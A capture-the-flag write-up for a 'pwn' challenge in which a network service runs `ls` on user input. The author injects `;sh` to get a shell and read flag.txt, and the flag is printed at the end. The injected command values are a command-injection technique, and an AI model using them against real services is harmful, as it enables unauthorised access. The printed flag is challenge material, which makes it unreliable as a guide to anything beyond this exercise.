# Roppy ropper
**category: pwn**  
**points: 467**

## Description
I love ropes do you?  
nc 35.238.225.156 1004

## Solution
After running netcat, this prompt showed up.
```
$ nc 35.238.225.156 1004
(list_me_like_crazy)
Is this lsass I dont understand :)
Give me your arguments:
```
I tried several inputs and got this:
```
(list_me_like_crazy)
Is this lsass I dont understand :)
Give me your arguments:
.
Result: ls .:
flag.txt
lsass
```
It looks like this program runs `ls` with input from us. Then I tried using a new bash statement to cat the flag.txt file.
```
Is this lsass I dont understand :)
Give me your arguments:
.; cat flag.txt
Result: ls .; :
flag.txt
lsass
```
It didn't work. Looks like only 3 characters is acceptable as input. Then I tried getting a reverse shell with `sh`.
```
(list_me_like_crazy)
Is this lsass I dont understand :)
Give me your arguments:
;sh
Result: ls ;sh:
flag.txt
lsass
cat flag.txt
b00t2root{R0p_cHa1nS_ar3_tH3_b3st}
```
It worked!

**FLAG:** `b00t2root{R0p_cHa1nS_ar3_tH3_b3st}`

